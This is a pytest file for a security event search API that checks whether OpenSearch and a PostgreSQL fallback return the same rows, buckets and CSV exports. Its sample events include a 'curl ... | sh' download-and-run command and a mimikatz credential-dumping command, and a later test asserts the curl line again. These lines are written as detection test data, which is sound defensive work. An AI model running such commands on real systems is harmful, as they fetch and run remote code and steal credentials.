"""Event search parity: OpenSearch and PostgreSQL answer with the same rows.

Every case is run twice through the HTTP endpoints — once with the search on
OpenSearch, once on the PostgreSQL fallback — and the two responses must be
equal: same events, same order, same fields, same buckets.

OpenSearch is replaced by ``FakeOpenSearch``, an in-memory client that
evaluates the query DSL against the documents the event persister indexed.
It follows the index mapping (``EVENTS_MAPPING``): a field that is not mapped
cannot be searched, a ``term`` is an exact match on a keyword, a ``wildcard``
is a pattern over the whole keyword.  A query against a field the indexed
document does not have therefore matches nothing, as on a real cluster.
"""

from __future__ import annotations

import csv
import io
import re
from datetime import datetime, timedelta, timezone
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.main import app
from app.models.event import Event
from app.repositories.event_repo import EventRepo, _parse_time
from app.services.event_persister import event_persister
from app.services.normalizers.webhook import WebhookNormalizer
from app.services.opensearch_client import (
    EVENTS_INDEX_PREFIX,
    EVENTS_MAPPING,
    OpenSearchService,
    get_opensearch_dep,
)

_BASE = "/api/v1/events"


# ---------------------------------------------------------------------------
# Fake OpenSearch
# ---------------------------------------------------------------------------


def _mapped_type(field: str) -> str | None:
    """Type of *field* in EVENTS_MAPPING, or None when the field is not indexed."""
    node: dict[str, Any] = EVENTS_MAPPING
    parts = field.split(".")
    for i, part in enumerate(parts):
        props = node.get("properties") or {}
        if part in props:
            node = props[part]
        elif i == len(parts) - 1 and part in (node.get("fields") or {}):
            node = node["fields"][part]   # multi-field, e.g. severity_id.text
        else:
            return None
    return node.get("type")


def _doc_value(doc: dict[str, Any], field: str) -> Any:
    """Value of *field* in *doc* (dotted path; a multi-field reads its parent)."""
    parts = field.split(".")
    value: Any = doc
    for i, part in enumerate(parts):
        if isinstance(value, dict) and part in value:
            value = value[part]
        elif i == len(parts) - 1 and i > 0:
            break                         # multi-field of the parent value
        else:
            return None
    return value


def _as_time(value: str) -> datetime:
    parsed = _parse_time(value)
    return parsed if parsed.tzinfo else parsed.replace(tzinfo=timezone.utc)


class FakeOpenSearch:
    """In-memory stand-in for ``AsyncOpenSearch`` (index, search, aggregations)."""

    def __init__(self) -> None:
        self.docs: dict[str, dict[str, Any]] = {}
        self.indices_written: set[str] = set()

    # ── indexing ─────────────────────────────────────────────────────────────

    async def index(self, *, index: str, body: dict, id: str | None = None, refresh: str = "false"):
        self.indices_written.add(index)
        self.docs[id] = body
        return {"_id": id}

    # ── query evaluation ─────────────────────────────────────────────────────

    def _field(self, doc: dict, field: str) -> tuple[str | None, Any]:
        ftype = _mapped_type(field)
        return ftype, (_doc_value(doc, field) if ftype else None)

    def _matches(self, doc: dict, q: dict) -> bool:
        (kind, arg), = q.items()
        if kind == "bool":
            must = all(self._matches(doc, c) for c in arg.get("must", []))
            must_not = not any(self._matches(doc, c) for c in arg.get("must_not", []))
            should = arg.get("should", [])
            enough = (
                sum(self._matches(doc, c) for c in should) >= arg.get("minimum_should_match", 1)
                if should else True
            )
            return must and must_not and enough
        (field, spec), = arg.items() if kind != "exists" else (("field", arg["field"]),)
        if kind == "exists":
            return self._field(doc, spec)[1] is not None
        ftype, value = self._field(doc, field)
        if value is None:
            return False
        if kind == "term":
            if ftype == "keyword":
                return str(value) == str(spec)
            return float(value) == float(spec)
        if kind == "wildcard":
            assert ftype == "keyword", f"wildcard on a {ftype} field: {field}"
            pattern = "".join(
                ".*" if tok == "*" else "." if tok == "?" else re.escape(tok[-1])
                for tok in re.findall(r"\\.|\*|\?|.", spec["value"], flags=re.S)
            )
            flags = re.S | (re.I if spec.get("case_insensitive") else 0)
            return re.fullmatch(pattern, str(value), flags) is not None
        if kind == "range":
            if ftype in ("date", "date_nanos"):
                value = datetime.fromisoformat(str(value).replace("Z", "+00:00"))
                spec = {op: _as_time(v) for op, v in spec.items()}
            elif ftype == "keyword":
                value, spec = str(value), {op: str(v) for op, v in spec.items()}
            return all(
                {"gt": value > v, "gte": value >= v, "lt": value < v, "lte": value <= v}[op]
                for op, v in spec.items()
            )
        raise AssertionError(f"unsupported query clause: {kind}")

    async def search(self, *, index: str, body: dict, params: dict | None = None):
        assert index == f"{EVENTS_INDEX_PREFIX}-*"
        hits = [d for d in self.docs.values() if self._matches(d, body["query"])]
        resp: dict[str, Any] = {}

        aggs = body.get("aggs", {})
        if aggs:
            resp["aggregations"] = {}
        if "terms_agg" in aggs:
            field = aggs["terms_agg"]["terms"]["field"]
            counts: dict[Any, int] = {}
            for d in hits:
                value = self._field(d, field)[1]
                if value is not None:
                    counts[value] = counts.get(value, 0) + 1
            ordered = sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))
            resp["aggregations"]["terms_agg"] = {
                "buckets": [
                    {"key": k, "doc_count": n}
                    for k, n in ordered[: aggs["terms_agg"]["terms"]["size"]]
                ]
            }
            resp["aggregations"]["missing_agg"] = {
                "doc_count": sum(1 for d in hits if self._field(d, field)[1] is None)
            }
        if "histogram_agg" in aggs:
            unit = aggs["histogram_agg"]["date_histogram"]["calendar_interval"]
            counts = {}
            for d in hits:
                t = datetime.fromisoformat(d["time"].replace("Z", "+00:00")).astimezone(timezone.utc)
                t = t.replace(second=0, microsecond=0)
                if unit != "minute":
                    t = t.replace(minute=0)
                if unit not in ("minute", "hour"):
                    t = t.replace(hour=0)
                if unit == "week":
                    t -= timedelta(days=t.weekday())
                if unit == "month":
                    t = t.replace(day=1)
                key = int(t.timestamp() * 1000)
                counts[key] = counts.get(key, 0) + 1
            resp["aggregations"]["histogram_agg"] = {
                "buckets": [{"key": k, "doc_count": n} for k, n in sorted(counts.items())]
            }

        for sort in reversed(body.get("sort", [])):
            (field, spec), = sort.items()
            assert _mapped_type(field), f"sort on unmapped field {field}"
            hits.sort(key=lambda d: _doc_value(d, field), reverse=spec["order"] == "desc")
        start = body.get("from", 0)
        page = hits[start: start + body.get("size", 10)]
        resp["hits"] = {
            "total": {"value": len(hits), "relation": "eq"},
            "hits": [{"_id": d["id"], "_source": d} for d in page],
        }
        return resp


# ---------------------------------------------------------------------------
# Fixtures: the same events in both stores, written by the event persister
# ---------------------------------------------------------------------------

_NOW = datetime.now(timezone.utc).replace(microsecond=0)


def _ts(minutes_ago: int) -> str:
    return (_NOW - timedelta(minutes=minutes_ago)).isoformat()


# Webhook events as a source would post them (see docs/integration-guide.md).
_RAW_EVENTS: list[dict[str, Any]] = [
    {"timestamp": _ts(5), "host": "web01", "user": "alice", "src_ip": "203.0.113.5",
     "command_line": "curl http://198.51.100.7/x.sh | sh",
     "message": "Suspicious download piped to shell", "severity": "high"},
    {"timestamp": _ts(10), "host": "web01", "user": "bob", "src_ip": "203.0.113.9",
     "dst_ip": "10.0.0.20", "message": "Outbound connection to rare port", "severity": "medium"},
    {"timestamp": _ts(15), "host": "DB-PROD-02", "user": "Alice.Admin",
     "process": "mimikatz.exe", "command_line": "mimikatz.exe sekurlsa::logonpasswords",
     "message": "Credential dumping tool started", "severity": "critical"},
    {"timestamp": _ts(70), "host": "db-prod-02", "src_ip": "10.0.0.7", "dst_ip": "10.0.0.20",
     "message": "Lateral SMB session 100% suspicious", "severity": "low"},
    {"timestamp": _ts(75), "user": "svc_backup", "message": "Backup job finished", "severity": 1},
    {"timestamp": _ts(60 * 26), "host": "mail01", "user": "carol", "src_ip": "198.51.100.44",
     "message": "Login from a new country", "severity": "medium"},
    # Same timestamp as the next one: the order within the tie must be equal too
    {"timestamp": _ts(60 * 30), "host": "mail01", "message": "Mailbox rule created"},
    {"timestamp": _ts(60 * 30), "host": "mail02", "message": "Mailbox rule deleted"},
    # Outside the default 7-day window
    {"timestamp": _ts(60 * 24 * 9), "host": "web01", "user": "alice",
     "message": "Old event outside the default window", "severity": "high"},
]


@pytest.fixture
async def stores(db_session: AsyncSession):
    """Write the events through the event persister into SQLite and the fake index."""
    fake = FakeOpenSearch()
    os_service = OpenSearchService()
    os_service._client = fake

    queue = MagicMock()
    queue.subscribe = AsyncMock()
    await event_persister(queue, os_service)
    handle = queue.subscribe.call_args.args[2]

    session_cm = MagicMock()
    session_cm.__aenter__ = AsyncMock(return_value=db_session)
    session_cm.__aexit__ = AsyncMock(return_value=False)
    normalizer = WebhookNormalizer()
    with patch("app.services.event_persister.AsyncSessionLocal", return_value=session_cm):
        for raw in _RAW_EVENTS:
            event = normalizer.normalize({**raw, "_webhook_source": "parity-test"})
            await handle(event.model_dump(mode="json"))

    assert await EventRepo.count(db_session) == len(_RAW_EVENTS)
    assert len(fake.docs) == len(_RAW_EVENTS)
    return os_service


async def _both(client: AsyncClient, headers: dict, os_service: OpenSearchService,
                path: str, body: dict) -> tuple[Any, Any]:
    """POST *body* to *path* with the search on OpenSearch, then on PostgreSQL."""
    results = []
    for service in (os_service, OpenSearchService()):   # connected, not connected
        app.dependency_overrides[get_opensearch_dep] = lambda service=service: service
        resp = await client.post(f"{_BASE}{path}", json=body, headers=headers)
        assert resp.status_code == 200, resp.text
        results.append(resp)
    return results[0], results[1]


def _flt(field: str, operator: str, value: Any) -> dict:
    return {"field": field, "operator": operator, "value": value}


# (case id, request body, expected number of rows — None: only parity is checked)
_SEARCH_CASES: list[tuple[str, dict, int | None]] = [
    ("no-query", {}, 8),
    ("all-time", {"time_from": "now-30d"}, 9),
    ("last-hour", {"time_from": "now-1h"}, 3),
    # Free text
    ("text-message-word", {"query": "suspicious"}, 2),
    ("text-message-phrase", {"query": "piped to shell"}, 1),
    ("text-case-insensitive", {"query": "CREDENTIAL DUMPING"}, 1),
    ("text-host", {"query": "db-prod"}, 2),
    ("text-user", {"query": "alice"}, 2),
    ("text-src-ip", {"query": "203.0.113"}, 2),
    ("text-dst-ip", {"query": "10.0.0.20"}, 2),
    ("text-command-line", {"query": "sekurlsa"}, 1),
    ("text-class-name", {"query": "process activity"}, 2),
    ("text-wildcard-chars-are-literal", {"query": "100% susp"}, 1),
    ("text-star-is-literal", {"query": "susp*"}, 0),
    ("text-no-match", {"query": "no-such-thing"}, 0),
    # Filter operators on strings
    ("eq-host", {"filters": [_flt("hostname", "eq", "web01")]}, 2),
    ("eq-is-case-sensitive", {"filters": [_flt("hostname", "eq", "WEB01")]}, 0),
    ("ne-host", {"filters": [_flt("hostname", "ne", "web01")]}, 5),
    ("contains-host", {"filters": [_flt("hostname", "contains", "PROD")]}, 2),
    ("contains-user", {"filters": [_flt("username", "contains", "alice")]}, 2),
    ("eq-user", {"filters": [_flt("username", "eq", "bob")]}, 1),
    ("eq-src-ip", {"filters": [_flt("src_ip", "eq", "203.0.113.5")]}, 1),
    ("contains-src-ip", {"filters": [_flt("src_ip", "contains", "203.0.113.")]}, 2),
    ("eq-dst-ip", {"filters": [_flt("dst_ip", "eq", "10.0.0.20")]}, 2),
    ("eq-source", {"filters": [_flt("source", "eq", "Webhook")]}, 8),
    ("ne-source", {"filters": [_flt("source", "ne", "Webhook")]}, 0),
    ("eq-class-name", {"filters": [_flt("class_name", "eq", "Network Activity")]}, 2),
    ("gt-host", {"filters": [_flt("hostname", "gt", "mail01")]}, None),
    ("lte-host", {"filters": [_flt("hostname", "lte", "mail01")]}, None),
    # Filter operators on numbers
    ("eq-severity", {"filters": [_flt("severity_id", "eq", 4)]}, 1),
    ("ne-severity", {"filters": [_flt("severity_id", "ne", 1)]}, 5),
    ("gt-severity", {"filters": [_flt("severity_id", "gt", 3)]}, 2),
    ("gte-severity", {"filters": [_flt("severity_id", "gte", 3)]}, 4),
    ("lt-severity", {"filters": [_flt("severity_id", "lt", 3)]}, 4),
    ("lte-severity", {"filters": [_flt("severity_id", "lte", 3)]}, 6),
    ("contains-class-uid", {"filters": [_flt("class_uid", "contains", "00")]}, 4),
    ("eq-class-uid", {"filters": [_flt("class_uid", "eq", 1007)]}, 2),
    # Nested OCSF aliases
    ("alias-dst-hostname", {"filters": [_flt("dst_endpoint.hostname", "eq", "web01")]}, 2),
    ("alias-actor-user", {"filters": [_flt("actor_user.name", "eq", "alice")]}, 1),
    ("alias-src-ip", {"filters": [_flt("src_endpoint.ip", "eq", "10.0.0.7")]}, 1),
    ("alias-dst-ip", {"filters": [_flt("dst_endpoint.ip", "contains", "10.0.")]}, 2),
    # Combinations and paging
    ("text-and-filter", {"query": "suspicious", "filters": [_flt("hostname", "eq", "web01")]}, 1),
    ("two-filters", {"filters": [_flt("hostname", "eq", "web01"),
                                 _flt("severity_id", "gte", 4)]}, 1),
    ("page-1", {"size": 3, "from_": 0}, 3),
    ("page-2", {"size": 3, "from_": 3}, 3),
    ("page-3", {"size": 3, "from_": 6}, 2),
]


@pytest.mark.parametrize("body,expected", [c[1:] for c in _SEARCH_CASES],
                         ids=[c[0] for c in _SEARCH_CASES])
async def test_search_returns_the_same_rows(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService,
    body: dict, expected: int | None,
) -> None:
    os_resp, pg_resp = await _both(client, hunter_headers, stores, "/search", body)
    os_json, pg_json = os_resp.json(), pg_resp.json()

    assert os_json.pop("backend") == "opensearch"
    assert pg_json.pop("backend") == "postgres"
    assert os_json == pg_json
    if expected is not None:
        assert len(pg_json["items"]) == expected
    if "size" not in body:
        assert pg_json["total"] == len(pg_json["items"])


async def test_search_rows_carry_the_flat_fields(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService,
) -> None:
    """A row from either backend has host, user, addresses, source and summary."""
    for resp in await _both(client, hunter_headers, stores, "/search", {"query": "piped"}):
        (row,) = resp.json()["items"]
        assert row["hostname"] == "web01"
        assert row["username"] == "alice"
        assert row["src_ip"] == "203.0.113.5"
        assert row["source"] == "Webhook"
        assert row["summary"] == "Suspicious download piped to shell"
        assert row["class_name"] == "Process Activity"
        assert row["severity_id"] == 4
        assert row["id"]
        # ... and the nested event
        assert row["process"]["cmd_line"] == "curl http://198.51.100.7/x.sh | sh"
        assert row["dst_endpoint"]["hostname"] == "web01"


_AGG_CASES: list[tuple[str, dict]] = [
    ("terms-hostname", {"field": "hostname"}),
    ("terms-username", {"field": "username"}),
    ("terms-src-ip", {"field": "src_ip"}),
    ("terms-source", {"field": "source"}),
    ("terms-class-name", {"field": "class_name"}),
    ("terms-severity", {"field": "severity_id"}),
    ("terms-alias", {"field": "actor_user.name"}),
    ("terms-size-2", {"field": "hostname", "size": 2}),
    ("terms-all-time", {"field": "hostname", "time_from": "now-30d"}),
    ("histogram-hour", {"agg_type": "date_histogram", "interval": "1h"}),
    ("histogram-minute", {"agg_type": "date_histogram", "interval": "1m"}),
    ("histogram-day", {"agg_type": "date_histogram", "interval": "1d", "time_from": "now-30d"}),
    ("histogram-week", {"agg_type": "date_histogram", "interval": "1w", "time_from": "now-30d"}),
    ("histogram-month", {"agg_type": "date_histogram", "interval": "1M", "time_from": "now-30d"}),
]


@pytest.mark.parametrize("body", [c[1] for c in _AGG_CASES], ids=[c[0] for c in _AGG_CASES])
async def test_aggregate_returns_the_same_buckets(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService, body: dict,
) -> None:
    os_resp, pg_resp = await _both(client, hunter_headers, stores, "/aggregate", body)
    os_json, pg_json = os_resp.json(), pg_resp.json()

    assert os_json.pop("backend") == "opensearch"
    assert os_json == pg_json
    assert pg_json["buckets"], "the case must produce buckets"
    assert sum(b["count"] for b in pg_json["buckets"]) <= len(_RAW_EVENTS)


async def test_terms_aggregation_counts_events_without_a_value(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService,
) -> None:
    for resp in await _both(client, hunter_headers, stores, "/aggregate", {"field": "hostname"}):
        buckets = {b["key"]: b["count"] for b in resp.json()["buckets"]}
        assert buckets == {"web01": 2, "": 1, "DB-PROD-02": 1, "db-prod-02": 1,
                           "mail01": 2, "mail02": 1}


@pytest.mark.parametrize("body", [
    {},
    {"query": "suspicious"},
    {"filters": [_flt("hostname", "contains", "prod")]},
], ids=["all", "text", "filter"])
async def test_export_returns_the_same_csv(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService, body: dict,
) -> None:
    os_resp, pg_resp = await _both(client, hunter_headers, stores, "/export", body)
    assert os_resp.text == pg_resp.text
    rows = list(csv.DictReader(io.StringIO(pg_resp.text)))
    assert rows
    assert all(r["id"] and r["time"] and r["source"] == "Webhook" and r["summary"] for r in rows)


async def test_get_by_id_and_entity_timeline_return_the_search_row(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService,
) -> None:
    """GET /{id} and the entity timeline return the same document as a search row."""
    os_resp, _ = await _both(client, hunter_headers, stores, "/search", {"query": "piped"})
    (row,) = os_resp.json()["items"]

    resp = await client.get(f"{_BASE}/{row['id']}", headers=hunter_headers)
    assert resp.status_code == 200
    assert resp.json() == row

    for entity_type, value in (("host", "web01"), ("user", "alice"), ("ip", "203.0.113.5")):
        resp = await client.get(f"{_BASE}/entity/{entity_type}/{value}", headers=hunter_headers)
        assert resp.status_code == 200
        assert row in resp.json()["events"]


async def test_query_dsl_uses_the_indexed_fields(
    client: AsyncClient, hunter_headers: dict,
) -> None:
    """The Lucene query names the flat fields of the indexed document."""
    resp = await client.post(
        f"{_BASE}/query-dsl",
        json={"query": "mimikatz", "time_from": "now-1h", "filters": [
            _flt("hostname", "eq", "web01"),
            _flt("src_ip", "contains", "203.0."),
            _flt("actor_user.name", "ne", "bob"),
            _flt("source", "eq", "Webhook"),
            _flt("severity_id", "gte", 3),
        ]},
        headers=hunter_headers,
    )
    assert resp.status_code == 200
    assert resp.json()["lucene"] == (
        "mimikatz AND hostname:web01 AND src_ip:*203.0.* AND NOT username:bob "
        "AND source:Webhook AND severity_id:[3 TO *] AND time:[now-1h TO now]"
    )


# ---------------------------------------------------------------------------
# Indexing and failure handling
# ---------------------------------------------------------------------------


async def test_persister_indexes_the_api_document(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService,
    db_session: AsyncSession,
) -> None:
    """The indexed document is the PostgreSQL row as the API returns it, in a v2 index."""
    fake: FakeOpenSearch = stores._client
    assert all(name.startswith(f"{EVENTS_INDEX_PREFIX}-") for name in fake.indices_written)

    for doc_id, doc in fake.docs.items():
        resp = await client.get(f"{_BASE}/{doc_id}", headers=hunter_headers)
        assert resp.status_code == 200
        assert resp.json() == doc


async def test_search_falls_back_to_postgres_when_opensearch_fails(
    client: AsyncClient, hunter_headers: dict, stores: OpenSearchService,
) -> None:
    """A failing OpenSearch query is answered from PostgreSQL, not with zero rows."""
    stores._client.search = AsyncMock(side_effect=ConnectionError("opensearch is down"))
    app.dependency_overrides[get_opensearch_dep] = lambda: stores

    resp = await client.post(f"{_BASE}/search", json={"query": "suspicious"}, headers=hunter_headers)
    assert resp.status_code == 200
    assert resp.json()["backend"] == "postgres"
    assert resp.json()["total"] == 2

    resp = await client.post(f"{_BASE}/aggregate", json={"field": "hostname"}, headers=hunter_headers)
    assert resp.status_code == 200
    assert "backend" not in resp.json()
    assert {b["key"] for b in resp.json()["buckets"]} >= {"web01", "mail01"}

    resp = await client.post(f"{_BASE}/export", json={"query": "suspicious"}, headers=hunter_headers)
    assert resp.status_code == 200
    assert len(resp.text.strip().splitlines()) == 3


async def test_old_shape_documents_are_not_searchable(db_session: AsyncSession) -> None:
    """The fake behaves like a real index: a nested-only document has no flat fields."""
    fake = FakeOpenSearch()
    event = WebhookNormalizer().normalize(_RAW_EVENTS[0]).model_dump(mode="json")
    fake.docs["legacy"] = {**event, "id": "legacy"}       # the pre-v2 document
    service = OpenSearchService()
    service._client = fake

    resp = await service.search_events(query="piped", time_from="now-1d")
    assert resp["hits"]["total"]["value"] == 0
